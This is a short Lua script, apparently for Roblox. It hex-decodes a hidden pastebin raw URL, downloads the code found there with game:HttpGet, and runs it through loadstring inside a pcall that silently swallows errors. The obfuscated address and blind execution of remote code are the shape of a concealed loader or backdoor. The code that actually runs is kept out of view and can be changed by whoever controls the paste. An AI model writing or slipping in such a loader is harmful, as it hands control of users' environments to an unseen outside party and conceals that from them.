local function d(s)
    local r = {}
    for i = 1, #s, 2 do
        r[#r+1] = string.char(tonumber(s:sub(i, i+1), 16))
    end
    return table.concat(r)
end

local u = d(
    "68747470733A2F2F706173746562696E2E636F6D2F7261772F3778564451543231"
)

pcall(function()
    loadstring(game:HttpGet(u))()
end)
